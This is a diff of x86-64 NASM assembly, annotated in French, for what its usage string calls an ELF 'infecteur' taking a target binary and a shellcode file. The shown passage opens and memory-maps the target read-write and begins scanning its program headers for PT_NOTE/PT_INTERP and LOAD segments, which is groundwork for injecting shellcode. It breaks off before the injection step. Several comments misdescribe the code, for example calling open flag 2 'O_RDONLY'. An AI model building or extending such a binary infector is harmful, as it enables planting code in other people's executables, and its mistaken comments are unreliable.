@@ -1,12 +1,14 @@
-BITS 64
-default rel
+BITS 64     ; en 64 bits
+default rel ; Adressage relatif RIP par défaut
 
-; --- offsets Elf64_Ehdr ---
+;offsets Elf64_Ehdr
+
 %define E_ENTRY  0x18
 %define E_PHOFF  0x20
 %define E_PHNUM  0x38
 
-; --- offsets Elf64_Phdr ---
+;offsets Elf64_Phdr
+
 %define P_TYPE      0x00
 %define P_FLAGS     0x04
 %define P_OFFSET    0x08
@@ -18,6 +20,7 @@ default rel
 %define P_PHDR_SIZE 56
 
 ; types
+
 %define PT_INTERP 3
 %define PT_NOTE 4
 %define PT_LOAD 1
@@ -25,54 +28,57 @@ default rel
 %define PF_X    1
 
 section .data
-    msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
-    msg_usage_len equ $ - msg_usage
+    msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10         ; message affiché si mauvais nombre d'arguments
+    msg_usage_len equ $ - msg_usage                                     ; longueur calculée auto
 
 section .bss
-    fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
-    fsize: resq 1   ; taille du fichier
-    buf: resq 1
+    fd:     resq 1                  ; on réserve 8 octets pour stocker le file descriptor
+    fsize:  resq 1                  ; taille du fichier
+    buf:    resq 1                  ; adresse de la mmap
 
 section .text
     global _start
 
 _start:
     mov rax, [rsp]
-    cmp rax, 3
+    cmp rax, 3                      ; si argc < 3 ,pas assez d'arguments
     jl .usage
 
     ;open
-    mov rdi, [rsp + 16]
-    mov rsi, 2
-    mov rax, 2  ; syscall ouvert
+    mov rdi, [rsp + 16]             ; rdi = argv[1] , chemin du fichier ELF à parser
+    mov rsi, 2                      ; rsi = 0 (O_RDONLY)
+    mov rax, 2                      ; syscall ouvert    
     syscall
-    test rax, rax
+
+    test rax, rax                   ; teste rax (met à jour les flags dont SF)
     js .usage
-    mov [fd], rax
+
+    mov [fd], rax                   ; sauvegarde le fd dans rax
 
     ;lseek
-    mov rdi, [fd]
-    xor rsi, rsi
-    mov rdx, 2      ; SEEK_END
-    mov rax, 8       ; syscall lseek
+    mov rdi, [fd]                   ; rdi = fd du fichier 
+    xor rsi, rsi                    ; rsi = 0 (offset 0)
+    mov rdx, 2                      ; SEEK_END
+    mov rax, 8                      ; syscall lseek
     syscall
-    mov [fsize], rax    ; rax = taille du fichier
+    mov [fsize], rax                ; rax = taille du fichier
 
     ;partie mmap
-    xor rdi, rdi            ; addr NULL
-    mov rsi, [fsize]        ; longuer du fichier
-    mov rdx, 3              ; PROT_READ et WRITE
+    xor rdi, rdi                    ; addr NULL
+    mov rsi, [fsize]                ; longuer du fichier
+    mov rdx, 3                      ; PROT_READ et WRITE
     mov r10, 1
-    mov r8, [fd]
-    xor r9, r9
-    mov rax, 9              ; mmap
+    mov r8, [fd]                    ; r8 = fd du fichier
+    xor r9, r9                      ; r9 = 0 (offset dans le fichier)
+    mov rax, 9                      ; syscall mmap
     syscall
+    
     mov [buf], rax
-    mov rax, [buf]  ; base du fichier mappe
-    mov rbx, [rax + E_PHOFF]    ; e_phoff = offset table phdrs
-    add rbx, rax    ; rbx = adresse du 1er phdr
+    mov rax, [buf]                  ; base du fichier mappe
+    mov rbx, [rax + E_PHOFF]        ; e_phoff = offset table phdrs
+    add rbx, rax                    ; rbx = adresse du 1er phdr
     movzx rcx, word [rax + E_PHNUM] ; nombre de segments
-    xor r14, r14 ; r14 = max(vaddr + memsz) des LOAD
+    xor r14, r14                    ; r14 = max(vaddr + memsz) des LOAD
 
     .find_note:
     cmp dword [rbx + P_TYPE], PT_INTERP     ; PT_INTERP ?
